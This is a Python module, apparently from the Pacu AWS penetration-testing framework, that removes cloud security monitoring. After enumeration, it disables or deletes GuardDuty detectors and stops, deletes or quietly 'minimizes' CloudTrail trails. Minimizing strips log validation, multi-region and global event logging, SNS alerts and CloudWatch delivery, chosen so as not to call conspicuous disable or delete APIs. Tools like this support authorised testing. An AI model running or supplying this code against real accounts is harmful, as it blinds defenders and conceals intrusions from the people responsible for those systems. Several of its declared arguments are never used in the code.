#!/usr/bin/env python3
import argparse


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'disrupt_monitoring',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'logging_monitoring',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Disables, deletes, or minimizes CloudTrail trails and GuardDuty detectors.',

    # Full description about what the module does and how it works
    'description': 'This module will take enumerated CloudTrail trails and GuardDuty detectors and present you with the option of disabling or deleting each one. For CloudTrail, you also have the option of minimizing it. Minimizing a trail leaves it enabled, but changes all the settings to their very basic level. These changes include: removing the associated SNS topic, disabling global service event logging, disabling multi-regional log collection, disabling log file validation, and removing the associated CloudWatch log group/role. The idea of this is to minimize the amount of logging in the environment without calling dangerous APIs like disable or delete.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['GuardDuty', 'CloudTrail', 'EC2', 'Config', 'monitoring'],  # CloudWatch needs to be "monitoring" and VPC needs to be "EC2" here for "ls" to work

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['enum_monitoring'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--trails', '--detectors', '--config-rules', '--config-recorders', '--config-delivery-channels', '--config-aggregators', '--alarms', '--flow-logs'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--trails', required=False, default=None, help='Comma-separated list of CloudTrail trail names and regions to target instead of enumerating them. They should be formatted like trail_name@region.')
parser.add_argument('--detectors', required=False, default=None, help='Comma-separated list of GuardDuty detector IDs and regions to target, instead of enumerating them. They should be formatted like detector_id@region.')
parser.add_argument('--config-rules', required=False, default=None, help='Comma-separated list of Config rule names and regions to target, instead of enumerating them. They should be formatted like rule_name@region.')
parser.add_argument('--config-recorders', required=False, default=None, help='Comma-separated list of Config configuration recorder names and regions to target, instead of enumerating them. They should be formatted like recorder_name@region.')
parser.add_argument('--config-delivery-channels', required=False, default=None, help='Comma-separated list of Config delivery channel names and regions to target, instead of enumerating them. They should be formatted like channel_name@region.')
parser.add_argument('--config-aggregators', required=False, default=None, help='Comma-separated list of Config configuration aggregator names and regions to target, instead of enumerating them. They should be formatted like aggregator_name@region.')
parser.add_argument('--alarms', required=False, default=None, help='Comma-separated list of CloudWatch alarm names and regions to target, instead of enumerating them. They should be formatted like alarm_name@region.')
parser.add_argument('--flow-logs', required=False, default=None, help='Comma-separated list of VPC Flow Log IDs and regions to target, instead of enumerating them. They should be formatted like log_id@region.')


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    fetch_data = pacu_main.fetch_data
    get_regions = pacu_main.get_regions
    ######

    detectors = []
    trails = []

    if args.detectors is None:
        if fetch_data(['GuardDuty', 'Detectors'], 'enum_monitoring', '--guard-duty') is False:
            print('Pre-req module not run successfully. Skipping GuardDuty...')
            detectors = []
        else:
            try:
                detectors = session.GuardDuty['Detectors']
            except:
                detectors = []  # They probably said no to enumerating detectors
    else:
        for detector in args.detectors.split(','):
            split = detector.split('@')
            try:
                detectors.append({
                    'Id': split[0],
                    'Region': split[1]
                })
            except:
                print('  Could not parse the supplied GuardDuty detectors and their regions. Use the format detector_id@region. Skipping detector {}...'.format(detector))

    if args.trails is None:
        if fetch_data(['CloudTrail', 'Trails'], 'enum_monitoring', '--cloud-trail') is False:
            print('Pre-req module not run successfully. Skipping CloudTrail...')
            trails = []
        else:
            try:
                trails = session.CloudTrail['Trails']
            except:
                trails = []  # They probably said no to enumerating trails
    else:
        for trail in args.trails.split(','):
            split = trail.split('@')
            try:
                trails.append({
                    'Name': split[0],
                    'Region': split[1]
                })
            except:
                print('  Could not parse the supplied CloudTrail trail and region. Use the format trail_name@region. Skipping trail {}...'.format(trail))

    ct_regions = get_regions('cloudtrail')
    gd_regions = get_regions('guardduty')

    if len(detectors) > 0:
        print('Starting GuardDuty...\n')

        for region in gd_regions:
            print('  Starting region {}...\n'.format(region))

            client = pacu_main.get_boto3_client('guardduty', region)

            for detector in detectors:
                if detector['Region'] == region:
                    action = input('    GuardDuty detector ID: {}\n        Do you want to disable (dis), delete (del), or skip (s) it? (dis/del/s) '.format(detector['Id']))

                    if action == 'dis':
                        try:
                            client.update_detector(
                                DetectorId=detector['Id'],
                                Enable=False
                            )
                            print('        Successfully disabled detector {}!\n'.format(detector['Id']))
                        except Exception as error:
                            print('        Could not disable detector {}:\n      {}\n'.format(detector['Id'], error))

                    elif action == 'del':
                        try:
                            client.delete_detector(
                                DetectorId=detector['Id']
                            )
                            print('        Successfully deleted detector {}!\n'.format(detector['Id']))
                        except Exception as error:
                            print('        Could not delete detector {}:\n      {}\n'.format(detector['Id'], error))

                    else:
                        print('    Skipping detector {}...\n'.format(detector['Id']))

        print('GuardDuty finished.\n')

    else:
        print('No detectors found. Skipping GuardDuty...\n')

    if len(trails) > 0:
        print('Starting CloudTrail...\n')

        for region in ct_regions:
            print('  Starting region {}...\n'.format(region))

            client = pacu_main.get_boto3_client('cloudtrail', region)

            for trail in trails:
                if trail['Region'] == region:
                    action = input('    CloudTrail trail name: {}\n        Do you want to disable (dis), delete (del), minimize (m), or skip (s) it? (dis/del/m/s) '.format(trail['Name']))

                    if action == 'dis':
                        try:
                            client.stop_logging(
                                Name=trail['Name']
                            )
                            print('        Successfully disabled trail {}!\n'.format(trail['Name']))
                        except Exception as error:
                            print('        Could not disable trail {}:\n      {}\n'.format(trail['Name'], error))

                    elif action == 'del':
                        try:
                            client.delete_trail(
                                Name=trail['Name']
                            )
                            print('        Successfully deleted trail {}!\n'.format(trail['Name']))
                        except Exception as error:
                            print('        Could not delete trail {}:\n      {}\n'.format(trail['Name'], error))

                    elif action == 'm':
                        try:
                            client.update_trail(
                                Name=trail['Name'],
                                SnsTopicName='',
                                IncludeGlobalServiceEvents=False,
                                IsMultiRegionTrail=False,
                                EnableLogFileValidation=False,
                                CloudWatchLogsLogGroupArn='',
                                CloudWatchLogsRoleArn=''
                            )
                            print('        Successfully minimized trail {}!\n'.format(trail['Name']))
                        except Exception as error:
                            print('        Could not minimize trail {}:\n      {}\n'.format(trail['Name'], error))

                    else:
                        print('        Skipping trail {}...\n'.format(trail['Name']))

        print('CloudTrail finished.\n')

    else:
        print('No trails found. Skipping CloudTrail...\n')

    print('{} completed.\n'.format(module_info['name']))
    return
